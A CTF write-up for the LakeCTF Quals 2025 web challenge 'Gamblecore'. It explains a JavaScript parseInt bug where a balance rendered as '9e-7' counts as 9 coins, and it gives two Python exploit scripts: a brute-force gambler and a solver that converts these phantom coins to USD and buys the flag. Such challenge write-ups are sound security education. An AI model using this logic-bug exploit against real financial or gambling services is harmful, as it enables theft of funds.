---
title: "LakeCTF Quals 2025: Gamblecore"
date: 2025-12-16 12:00:00 +0700
categories: [CTF Writeup, Web]
tags: [LakeCTF, logic bug, javascript, automation]
math: true
---

## Challenge Summary

We are provided with a `.zip` source code file and a URL to access the **NEON CASINO** web application.

* **Starting Balance:** 10 Microcoins (which equals $0.00001$ Coins).
* **Goal:** We need to acquire **$10 USD** to purchase the flag from the "Black Market".
* **Game Rules:** You can gamble your coins or USD. There is a **9% chance to win**, and a win multiplies your bet by 10. You can also convert Coins to USD at a rate of 1 Coin = $0.01 USD.

## Initial Analysis (The Brute-Force Attempt)

First, I analyzed the `server.js` file located in the `gamblecore.zip` archive. Initially, the code appeared secure, so I attempted a brute-force strategy.

From `server.js`, we see that the win rate is fixed at 9%. To turn our starting 10 Microcoins into the 1,000 Coins needed for $10 USD, we would need to win roughly 8-9 consecutive "All-In" bets.

I wrote a script to automate this:

```python
import requests
import urllib3

# Suppress warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL = "[https://chall.polygl0ts.ch:8148](https://chall.polygl0ts.ch:8148)"

def solve():
    sessions = requests.Session()
    retry_count = 0

    while True:
        retry_count += 1
        sessions.cookies.clear() # Reset session

        # Enter Casino (Initialize Wallet)
        sessions.get(f"{BASE_URL}/api/balance", verify=False)
        
        current_balance = 0.00001
        wins = 0
        
        while current_balance < 1001:
            try:
                resp = sessions.post(
                    f"{BASE_URL}/api/gamble",
                    json={"currency": "coins", "amount": current_balance},
                    verify=False,
                    timeout=5
                )
                data = resp.json()

                if "error" in data:
                    break
                
                if data.get("win") == True:
                    current_balance = data.get("new_balance")
                    wins += 1
                    print(f"[+] Win #{wins}! Balance: {current_balance} Coins")
                else:
                    break # Lost, restart session

            except Exception as e:
                print(f"An error occurred: {e}")
                break

        if current_balance >= 1000:
            print(f"[+] Success after {retry_count} tries! Balance: {current_balance}")
            
            # Convert 1000 coins -> $10 USD
            sessions.post(f"{BASE_URL}/api/convert", json={"amount": 1000}, verify=False)
            
            # Buy flag
            response = sessions.post(f"{BASE_URL}/api/flag", verify=False)
            print(f"[*] FLAG: {response.json().get('flag')}")
            return

if __name__ == "__main__":
    solve()
```

**Result:** This approach is inefficient because it relies purely on luck with extremely low probability ($0.09^9 \approx 3 \times 10^{-10}$).

After running the script for 30 minutes with no success, I decided to look for a logic vulnerability.

## Vulnerability Analysis (The Logic Bug)

I re-examined the `server.js` code and found a critical flaw in the currency conversion logic.

The vulnerability is in the use of `parseInt(wallet.coins)`.

In JavaScript, numbers are stored as floating-point values. When a number becomes extremely small (specifically smaller than $10^{-6}$), JavaScript automatically converts it to scientific notation when casting it to a string.

**The Bug:**
If you have `0.0000009` coins, JavaScript represents this string as `"9e-7"`.

The `parseInt()` function parses the string from left to right. It takes the `9` but stops at the non-numeric character `e`.

**Result:** `parseInt("9e-7")` returns **9**.

The server thinks we have 9 Coins when we actually have less than one microcoin. We can convert these "ghost coins" into real USD.

## The Exploit Strategy

We can exploit this reliably using the following steps:

### Step 1: Trigger the parseInt Bug

* **Initial Balance:** 0.00001 coins ($10^{-5}$).
* **Action:** We need to lower our balance to $9 \times 10^{-7}$ (0.0000009). We do this by betting exactly `0.0000091` coins.
* **Math:** $0.00001 - 0.0000091 = 0.0000009$.
* **Result:** If we lose the bet (which is 91% likely), our balance becomes `9e-7`.

**Execution:**
1.  We call `/api/convert` with `amount: 9`.
2.  `parseInt("9e-7")` returns 9.
3.  The check `amount <= coinBalance` passes ($9 \le 9$).
4.  We receive $9 \times 0.01 = \mathbf{\$0.09\ USD}$.

### Step 2: Gamble USD to reach $10

Now we have legitimate funds ($0.09 USD). While we still need to gamble, the odds are much better. We only need to win 2-3 times in a row instead of 9.

* **Bet $0.09 (All-in):** If we win $\rightarrow$ $0.90.
* **Bet $0.90 (All-in):** If we win $\rightarrow$ $9.00.
* **Bet $1.00:** Since we have $9.00, we have 9 chances to win a single $1.00 bet to cross the $10 mark.

This strategy has a success probability of roughly $\approx 0.8\%$ (much higher than the brute force method), allowing us to solve it in seconds.

## Final Solution Script

Here is the optimized Python script that implements the logic bug exploit:

```python
import requests
import urllib3
import sys

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "[https://chall.polygl0ts.ch:8148](https://chall.polygl0ts.ch:8148)"

def solve():
    print("[*] Starting exploit...")
    attempts = 0
    
    while True:
        attempts += 1
        s = requests.Session()
        
        try:
            # Step 1: Lower balance to scientific notation (9e-7)
            # We start with 10e-6. We bet 9.1e-6.
            # 0.00001 - 0.0000091 = 0.0000009 (which is 9e-7)
            bet_setup = 0.0000091
            r = s.post(f"{URL}/api/gamble", json={'currency': 'coins', 'amount': bet_setup}, verify=False)
            
            # If we won the setup bet, our balance is wrong. Restart.
            if r.json().get('win') is True:
                sys.stdout.write(f"\r[-] Attempt {attempts}: Setup bet won (bad luck), retrying...")
                continue

            # Step 2: Exploit parseInt bug
            # We effectively have 0 coins, but parseInt("9e-7") returns 9.
            r = s.post(f"{URL}/api/convert", json={'amount': 9}, verify=False)
            
            # If conversion failed, try 8 (handling minor precision variances)
            if 'success' not in r.text:
                r = s.post(f"{URL}/api/convert", json={'amount': 8}, verify=False)
                if 'success' not in r.text:
                    continue

            # Check new USD balance
            bal_res = s.get(f"{URL}/api/balance", verify=False).json()
            usd = bal_res['usd']
            
            if usd == 0: continue

            print(f"\n[+] Bug Triggered! Wallet contains: ${usd} USD")

            # Step 3: Gamble the USD up to $10
            
            # Round 1: All in ($0.09 -> $0.90)
            r = s.post(f"{URL}/api/gamble", json={'currency': 'usd', 'amount': usd}, verify=False)
            if not r.json().get('win'): continue 
            usd = r.json()['new_balance']
            print(f"    [+] Won Round 1! Balance: ${usd}")

            # Round 2: All in ($0.90 -> $9.00)
            r = s.post(f"{URL}/api/gamble", json={'currency': 'usd', 'amount': usd}, verify=False)
            if not r.json().get('win'): continue
            usd = r.json()['new_balance']
            print(f"    [+] Won Round 2! Balance: ${usd}")

            # Round 3: Safe bets to cross $10
            while 1 <= usd < 10:
                r = s.post(f"{URL}/api/gamble", json={'currency': 'usd', 'amount': 1}, verify=False)
                data = r.json()
                usd = data['new_balance']
                if data.get('win'):
                    print(f"    [+] Won Final Round! Balance: ${usd}")
                    break

            # Step 4: Buy the Flag
            if usd >= 10:
                print("[*] Buying flag...")
                r = s.post(f"{URL}/api/flag", verify=False)
                print(f"\nSUCCESS! FLAG: {r.json().get('flag')}")
                break

        except Exception as e:
            continue

if __name__ == "__main__":
    solve()
Flag: EPFL{we_truly_live_in_a_society}
```